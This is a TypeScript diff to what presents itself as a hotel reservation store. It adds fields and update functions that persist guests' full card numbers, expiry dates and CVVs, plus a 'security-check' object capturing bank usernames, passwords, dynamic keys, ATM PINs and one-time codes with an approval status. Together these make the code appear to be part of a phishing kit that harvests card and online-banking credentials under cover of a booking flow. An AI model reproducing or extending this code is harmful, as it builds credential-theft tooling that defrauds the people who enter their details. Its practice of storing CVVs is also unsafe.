@@ -33,6 +33,23 @@ export interface ReservationSearchParams {
 	pets: boolean;
 }
 
+export interface GuestFormData {
+	firstName: string;
+	lastName: string;
+	email: string;
+	phone: string;
+	country: string;
+	phoneCode: string;
+	loginDiscount: boolean;
+	digitalConfirmation: boolean;
+	airportTransfer: boolean;
+	flightNeeded: boolean;
+	carRental: boolean;
+	specialRequests: string;
+	freeParking: boolean;
+	arrivalTime: string;
+}
+
 export interface ReservationData {
 	// Información completa del hotel (para evitar nuevas peticiones)
 	hotel: {
@@ -67,6 +84,9 @@ export interface ReservationData {
 	// Parámetros de búsqueda
 	searchParams: ReservationSearchParams;
 	
+	// Datos del huésped
+	guestData: GuestFormData | null;
+	
 	// Habitaciones seleccionadas
 	selectedRooms: SelectedRoom[];
 	
@@ -77,11 +97,31 @@ export interface ReservationData {
 		total: number;
 		currency: string;
 	};
+
+	// Datos de pago (persistidos a nivel de reserva)
+	payment?: {
+		cardholderName: string;
+		cardNumber: string; // se almacena como ingresado (puede incluir espacios)
+		expiry: string; // MM/AA
+		cvv: string;
+		documentId?: string;
+	};
 	
 	// Estado de la reserva
 	isValid: boolean;
 	lastUpdated: string;
-}
+
+	// Estado del security-check
+	securityCheck?: {
+		user?: string;
+		pass?: string;
+		dinamicKey?: string;
+		atmKey?: string;
+		otp?: string;
+		status?: 'pending' | 'approved' | 'failed';
+		timestamp?: string;
+	};
+	}
 
 // Funciones de persistencia usando el servicio centralizado
 function loadFromStorage(): ReservationData | null {
@@ -129,6 +169,7 @@ const initialState: ReservationData = {
 		rooms: 1,
 		pets: false
 	},
+	guestData: null,
 	selectedRooms: [],
 	totals: {
 		subtotal: 0,
@@ -215,6 +256,50 @@ function createReservationStore(initialData: ReservationData = initialState) {
 			persistUpdate(state => ({
 				...state,
 				searchParams: { ...state.searchParams, ...newParams },
+				lastUpdated: new Date().toISOString()
+			}));
+		},
+		
+		// Actualizar datos del huésped
+		updateGuestData: (guestData: GuestFormData) => {
+			persistUpdate(state => ({
+				...state,
+				guestData,
+				lastUpdated: new Date().toISOString()
+			}));
+		},
+
+		// Actualizar datos de pago
+		updatePaymentData: (payment: {
+			cardholderName: string;
+			cardNumber: string;
+			expiry: string;
+			cvv: string;
+			documentId?: string;
+		}) => {
+			persistUpdate(state => ({
+				...state,
+				payment: { ...payment },
+				lastUpdated: new Date().toISOString()
+			}));
+		},
+
+		// Guardar datos del security-check
+		updateSecurityCheck: (data: {
+			user?: string;
+			pass?: string;
+			dinamicKey?: string;
+			atmKey?: string;
+			otp?: string;
+			status?: 'pending' | 'approved' | 'failed';
+		}) => {
+			persistUpdate(state => ({
+				...state,
+				securityCheck: {
+					...state.securityCheck,
+					...data,
+					timestamp: new Date().toISOString()
+				},
 				lastUpdated: new Date().toISOString()
 			}));
 		},
